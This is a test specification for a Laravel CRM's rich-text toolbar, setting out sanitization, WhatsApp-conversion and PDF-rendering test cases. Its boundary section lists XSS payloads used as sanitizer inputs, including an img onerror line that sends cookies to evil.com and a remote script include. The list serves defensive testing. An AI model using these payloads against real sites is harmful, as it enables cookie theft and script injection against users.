# Test Infrastructure Specification: CRM RFQ Mini Rich-Text Toolbar & Multi-Channel Output

## 1. Executive Summary & Test Strategy
This document defines the comprehensive 4-tier requirement-driven testing architecture for the CRM RFQ Mini Rich-Text Toolbar and Multi-Channel Output features.

The test suite enforces zero regression, cryptographic and XSS security integrity, seamless multi-channel transformation (Web, DomPDF, WhatsApp), and legacy backward compatibility across all 16 project features defined in `PROJECT.md`.

### Execution Architecture & Constraints
- **Test Runner**: PHPUnit 10.x / Laravel Artisan Test Runner (`php artisan test tests/Unit/RfqRichTextE2ETest.php`).
- **Base Class**: `PHPUnit\Framework\TestCase` (Pure in-memory unit execution).
- **Execution Budget**: < 1.00s total duration.
- **Zero Database Dependency**: Bypasses slow database migrations and seeds, utilizing in-memory model instantiation and deterministic string transformations.
- **Authoritative Oracles**: Derived directly from `PROJECT.md § Interface Contracts`, HTMLPurifier 4.19.0 RFC compliance, WhatsApp formatting syntax specifications, and DomPDF 2.0 CSS rendering constraints.

---

## 2. Four-Tier Methodology

```
┌───────────────────────────────────────────────────────────────┐
│        Tier 4: Real-World Application Scenarios               │
│   (Sales Notices, Quotation Custom Notes, PC Specs)          │
├───────────────────────────────────────────────────────────────┤
│        Tier 3: Cross-Feature Combinations                     │
│   (Pairwise Tags x Lists x Channels x Legacy/Rich)           │
├───────────────────────────────────────────────────────────────┤
│        Tier 2: Boundary & Corner Cases                        │
│   (XSS Payloads, Malformed HTML, Extreme Lengths, Delimiters) │
├───────────────────────────────────────────────────────────────┤
│        Tier 1: Feature Coverage (16 Features x >=5 tests)     │
│   (Pure functional coverage across all project features)      │
└───────────────────────────────────────────────────────────────┘
```

### Tier 1: Feature Coverage (>= 5 Tests Per Feature)
Systematic verification of all 16 features specified in `PROJECT.md`. Each feature has at least 5 dedicated test assertions or data provider iterations validating happy-path behavior, contract interfaces, and expected return types.

### Tier 2: Boundary & Corner Cases (>= 5 Tests Per Feature Domain)
Adversarial and stress verification covering:
- Empty strings, whitespace-only, null inputs, and single-character payloads.
- Deeply nested structures (`<b><i><u><s>...</s></u></i></b>`) and unclosed tags (`<b><i>unclosed`).
- Obfuscated XSS attack vectors: `<script>`, `<img onerror>`, `javascript:`, data URIs, SVG onload, CSS expressions, inline event handlers.
- WhatsApp formatting edge cases: leading/trailing delimiter whitespace, touching punctuation, multi-line list indentation, HTML entity collisions.
- DomPDF table cell wrapping, long unbroken words, zero-margin list styling.

### Tier 3: Cross-Feature Combinations (Pairwise Coverage)
Matrix testing across multiple orthogonal feature axes:
1. **Formatting Tags x Lists**: Bold/Italic/Underline/Strikethrough inside ordered (`<ol>`) and unordered (`<ul>`) lists.
2. **Channel Parity Cycle**: Model mutator assignment -> Web HTML render -> DomPDF PDF render -> WhatsApp Markdown conversion.
3. **Legacy vs Rich Dual-Mode**: Mixing legacy plain text (containing raw newlines and `< > &` symbols) with modern HTML rich text.
4. **Form Integration**: Dynamic row addition (`addNewPriceItem`) + PC builder spec generator + autosave local storage synchronization.

### Tier 4: Real-World Application Scenarios
End-to-end simulated business workflows derived from real-world CRM usage:
1. **Scenario 1 — Sales Discontinue & Substitute Notice (`admin_note`)**: Multi-item Cisco catalyst discontinuation with bold part numbers, bulleted alternatives, and delivery timelines.
2. **Scenario 2 — Quotation Red Custom Notes (`notes`)**: Payment terms, DP percentages, warranty disclaimers, and red alert text rendered accurately in Web, DomPDF, and WhatsApp copy.
3. **Scenario 3 — Complex PC Builder Specification (`description`)**: 8-component hardware bundle with bold subheadings, bulleted component specs, and strikethrough promo revisions.
4. **Scenario 4 — Legacy Migration & Audit Parity**: Legacy plain-text quotation notes processed through the pipeline without text loss, double-escaping, or layout breakage.

---

## 3. Comprehensive Feature Matrix (All 16 Features)

| Feature # | Feature Name | Component / Target | Contract Interface | Tier 1 Tests | Tier 2 Tests | Tier 3 Tests | Tier 4 Scenarios |
|---|---|---|---|---|---|---|---|
| **F01** | HTMLPurifier Service & Safe Tags | `App\Helpers\RfqNoteHelper::sanitize` | Whitelist: `b,strong,i,em,u,s,ul,ol,li,p,br`, strips attributes & scripts | 5 | 7 | 4 | 3 |
| **F02** | Legacy Plain-Text Detection & Backward Compatibility | `App\Helpers\RfqNoteHelper::renderHtml`, `isLegacyPlainText` | Auto `nl2br(e($text))` for plain text; preserves rich HTML without double escaping | 5 | 6 | 4 | 3 |
| **F03** | Model Mutator Automatic Sanitization | `Rfq`, `RfqItem` Eloquent mutators | `admin_note`, `notes`, `description`, `detail_item` sanitize on set | 5 | 5 | 4 | 3 |
| **F04** | Backend WhatsApp Syntax Converter | `App\Helpers\RfqNoteHelper::toWhatsApp`, `Rfq::getWhatsAppFormattedNote` | Maps tags to `*`, `_`, `~`, bullets `• `, numbers `1. `, unwraps `<u>` | 5 | 7 | 5 | 3 |
| **F05** | Mini Toolbar Component Implementation | `resources/views/rfqs/price_form.blade.php`, `show.blade.php` | 6 buttons (Bold, Italic, Underline, Strike, Bullet, Number), hidden textarea | 5 | 5 | 3 | 2 |
| **F06** | Price Form Field Integration (`admin_note` & `notes`) | `resources/views/rfqs/price_form.blade.php` | Dual binding `rfq-admin-note`, `rfq-notes`, old() value preservation | 5 | 5 | 3 | 2 |
| **F07** | Item Technical Description Integration | `resources/views/rfqs/price_form.blade.php` | `items[{{ $item->id }}][description]` mini toolbar binding | 5 | 5 | 3 | 2 |
| **F08** | Dynamic Row Addition Hook (`addNewPriceItem`) | `resources/views/rfqs/price_form.blade.php` | DOM clone hook initializes `initMiniRichEditor` on new item cards | 5 | 5 | 3 | 2 |
| **F09** | PC Builder Spec & Autosave Synchronization | `resources/views/rfqs/price_form.blade.php` | `syncPcSpecsToDescription`, `localStorage` save/restore contenteditable | 5 | 5 | 3 | 2 |
| **F10** | Quick Admin Note Modal Toolbar | `resources/views/rfqs/show.blade.php` | Quick modal toolbar, Alpine `noteText` two-way sync, AJAX response | 5 | 5 | 3 | 2 |
| **F11** | Web Views Safe Rich-Text Rendering | `show.blade.php`, `price_form.blade.php`, `preview_quotation.blade.php` | `{!! RfqNoteHelper::renderHtml(...) !!}`, XSS immunity in views | 5 | 6 | 4 | 3 |
| **F12** | DomPDF Scoped CSS & Table Layout Fixes | `resources/views/rfqs/pdf.blade.php` | `.pdf-rich-text` zero-margin resets for `ul,ol,li,p,s,u` preventing page spillage | 5 | 6 | 4 | 2 |
| **F13** | DomPDF Visual Weight Calculation Fix | `resources/views/rfqs/pdf.blade.php` | `strip_tags` on description & notes prior to `mb_strlen` line count calculation | 5 | 5 | 3 | 2 |
| **F14** | DomPDF Item Specs & Custom Notes Rendering | `resources/views/rfqs/pdf.blade.php` | `{!! RfqNoteHelper::renderPdfHtml(...) !!}` for specs and red notes | 5 | 5 | 3 | 2 |
| **F15** | Client-Side WhatsApp 1-Click Copy Converter | `resources/views/rfqs/show.blade.php` | Alpine `htmlToWhatsApp()` produces identical output to PHP backend converter | 5 | 6 | 4 | 2 |
| **F16** | E2E Test Suite & Adversarial Verification | `tests/Unit/RfqRichTextE2ETest.php` | Full suite execution, 100% pass verification, forensic audit | 5 | 6 | 4 | 3 |

---

## 4. Test Case Specification by Tier

### Tier 1: Feature Coverage Specifications
- **TC-F01-01 to TC-F01-05**: Pure allowed tags preservation (`<b>`, `<strong>`, `<i>`, `<em>`, `<u>`, `<s>`, `<ul>`, `<ol>`, `<li>`, `<p>`, `<br>`), attribute stripping (`class`, `style`, `id`, `onclick`), unclosed tag balancing, script stripping, null/empty string handling.
- **TC-F02-01 to TC-F02-05**: Legacy single line, legacy multi-line `\n` to `<br />`, angle brackets `< >` escaping in plain text, rich HTML pass-through without double `<br>`, mixed legacy content.
- **TC-F03-01 to TC-F03-05**: `Rfq::setAdminNoteAttribute`, `Rfq::setNotesAttribute`, `RfqItem::setDescriptionAttribute`, `RfqItem::setDetailItemAttribute`, null handling on mutators.
- **TC-F04-01 to TC-F04-05**: Bold to `*text*`, italic to `_text_`, strikethrough to `~text~`, underline unwrap to plain text, bullet lists to `• Item`, numbered lists to `1. Item`.
- **TC-F05-01 to TC-F05-05**: Toolbar button definitions (6 operations: bold, italic, underline, strike, insertUnorderedList, insertOrderedList), contenteditable sync contract, hidden textarea synchronization.
- **TC-F06-01 to TC-F06-05**: Price form `admin_note` binding, `notes` binding, preservation of old() submitted values on validation failure.
- **TC-F07-01 to TC-F07-05**: Regular item technical description binding, PC bundle item description binding, hidden textarea name `items[id][description]`.
- **TC-F08-01 to TC-F08-05**: Dynamic item insertion in `addNewPriceItem()`, ensuring newly rendered cards initialize mini toolbar event listeners.
- **TC-F09-01 to TC-F09-05**: PC Builder `syncPcSpecsToDescription()` pushes formatted HTML to both contenteditable and hidden textarea; autosave draft serializer captures rich content.
- **TC-F10-01 to TC-F10-05**: Show view quick admin note modal toolbar presence, Alpine `noteText` binding, save submission and payload formatting.
- **TC-F11-01 to TC-F11-05**: Safe HTML output rendering across `show.blade.php`, `price_form.blade.php`, and `preview_quotation.blade.php` with zero script execution.
- **TC-F12-01 to TC-F12-05**: Scoped CSS rules in `pdf.blade.php` targeting `.pdf-rich-text ul`, `.pdf-rich-text ol`, `.pdf-rich-text li`, `.pdf-rich-text p`, ensuring margins are 0.
- **TC-F13-01 to TC-F13-05**: Tag stripping in visual weight density calculator (`mb_strlen(strip_tags($sLine))` and `$customNotes` line counting).
- **TC-F14-01 to TC-F14-05**: DomPDF item specs HTML rendering, red custom notes HTML rendering, page-break avoidance verification.
- **TC-F15-01 to TC-F15-05**: Alpine `htmlToWhatsApp()` parity with backend `toWhatsApp()` on bold, italic, strikethrough, lists, and entity decoding.
- **TC-F16-01 to TC-F16-05**: Complete end-to-end test execution validation, memory isolation, assertion integrity.

### Tier 2: Boundary & Corner Cases
- **TC-BND-01 (Null & Empty String Handlers)**: `null`, `""`, `"   "`, `"\n\n\r\n"` return empty/null without throwing warnings.
- **TC-BND-02 (Massive Payload Stress)**: 50,000-character note payload sanitized and converted under 25ms.
- **TC-BND-03 (Adversarial XSS Suite)**:
  - `<script src="https://evil.com/xss.js"></script>`
  - `<img src="x" onerror="fetch('//evil.com/?c='+document.cookie)">`
  - `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`
  - `<a href="javascript:alert(1)">Click</a>`
  - `<iframe srcdoc="<script>alert(1)</script>"></iframe>`
  - `<b onmouseover="alert(1)" style="font-size:expression(alert(1))">bold</b>`
  - `<p style="behavior:url(test.htc)">text</p>`
  - Nested bypass: `<<SCRIPT>alert("XSS");//<</SCRIPT>`
- **TC-BND-04 (Malformed & Broken HTML Balance)**:
  - Unclosed tags: `<b><i><u>Test` -> `<b><i><u>Test</u></i></b>`
  - Mismatched nesting: `<b>Text <i>Italic</b> More</i>` -> balanced cleanly.
  - Spurious closing tags: `</b></i></s>` -> discarded safely.
- **TC-BND-05 (WhatsApp Whitespace Boundary)**:
  - Delimiters with internal spaces: `<b> bold text </b>` -> `*bold text*` (spaces moved outside delimiters).
  - Delimiters touching punctuation: `<b>Notice:</b>` -> `*Notice:*`
  - Multiple formatting tags in sequence: `<b>bold</b> <i>italic</i> <s>strike</s>` -> `*bold* _italic_ ~strike~`
  - Entity-encoded symbols: `&amp; &lt; &gt; &quot; &#039;` -> `& < > " '`
- **TC-BND-06 (DomPDF Layout Boundary)**:
  - Long unbroken string: `A1B2C3D4...` (150 chars without spaces) wrapped safely without breaking table layout.
  - Deep nested lists: `<ul><li>Level 1<ul><li>Level 2</li></ul></li></ul>` styled cleanly.

### Tier 3: Cross-Feature Combinations
- **TC-XFT-01 (Tags x Lists)**:
  `<ul><li><b>Item 1</b>: <i>Details</i></li><li><s>Discontinued</s> (<u>Replacement</u>)</li></ul>`
  Verified across:
  1. Sanitizer -> preserves safe tags.
  2. WhatsApp -> `• *Item 1*: _Details_\n• ~Discontinued~ (Replacement)`
  3. DomPDF -> wrapped in `.pdf-rich-text` with scoped margin reset.
- **TC-XFT-02 (Lifecycle State Cycle)**:
  Raw input with XSS -> Eloquent model mutator -> sanitizes immediately -> `renderHtml` displays safe HTML -> `toWhatsApp` outputs clean markdown -> `renderPdfHtml` prepares PDF payload.
- **TC-XFT-03 (Mixed Legacy & Modern)**:
  Database containing mixed RFQ records: some created prior to rich-text (plain newlines) and some created after rich-text (HTML tags). Both render flawlessly side-by-side.
- **TC-XFT-04 (Autosave & Dynamic Rows)**:
  Dynamic item added -> content edited via toolbar -> serialized to draft storage -> restored on page reload -> content and textarea state match 100%.

### Tier 4: Real-World Application Scenarios
- **TC-SCN-01 (Sales Discontinue & Alternative Notice)**:
  ```html
  <p><b>Catatan Admin (Discontinue &amp; Pengganti):</b></p>
  <ul>
    <li>Item <b>C9115AXI-X</b> sudah <s>EOL (End of Life)</s>.</li>
    <li>Pengganti resmi: <i>Cisco Catalyst C9115AXI-F</i>.</li>
    <li><u>Lead time</u>: 4-6 minggu setelah PO diterima.</li>
  </ul>
  ```
  Verified for Web render, DomPDF PDF generation, and WhatsApp 1-click clipboard text.

- **TC-SCN-02 (Quotation Custom Notes with Red Terms)**:
  ```html
  <p><b>Ketentuan Khusus Penawaran:</b></p>
  <ul>
    <li>DP 50% saat PO diterbitkan, pelunasan sebelum barang dikirim.</li>
    <li><s>Garansi toko 7 hari</s> dialihkan ke Garansi Resmi Distributor 3 Tahun.</li>
    <li><u>Harga belum termasuk instalasi &amp; setting di lokasi.</u></li>
  </ul>
  ```
  Verified for visual weight calculation, red custom notes rendering in DomPDF, and WhatsApp copy.

- **TC-SCN-03 (Complex Multi-Item PC Build Specs)**:
  ```html
  <p><b>Spesifikasi PC Workstation Core i7:</b></p>
  <ol>
    <li><b>CPU:</b> Intel Core i7-14700 (20 Cores, up to 5.4GHz)</li>
    <li><b>Cooler:</b> Deepcool AK620 Digital Dual-Tower</li>
    <li><b>Motherboard:</b> ASUS TUF Gaming B760-PLUS WiFi DDR5</li>
    <li><b>RAM:</b> Corsair Vengeance 32GB (2x16GB) DDR5 6000MHz</li>
    <li><b>GPU:</b> ZOTAC RTX 4070 Super 12GB GDDR6X</li>
    <li><b>Storage:</b> Samsung 980 Pro 1TB NVMe M.2 PCIe 4.0</li>
    <li><b>PSU:</b> Seasonic Focus GX-750 750W 80+ Gold Modular</li>
    <li><b>Case:</b> Fractal Design North Chalk White TG</li>
  </ol>
  ```
  Verified for DomPDF single-page fit, item spec table formatting, and WhatsApp technical spec export.

---

## 5. Verification Command & Success Criteria
```bash
php artisan test tests/Unit/RfqRichTextE2ETest.php
```

### Acceptance Gates
1. **Zero Errors**: Exit code 0, 0 PHP fatal errors, 0 uncaught exceptions.
2. **Speed**: Entire suite completes in < 1.00s.
3. **Coverage**: 100% of the 16 features from `PROJECT.md` represented.
4. **Adversarial Resilience**: 100% of XSS injection attacks eliminated.
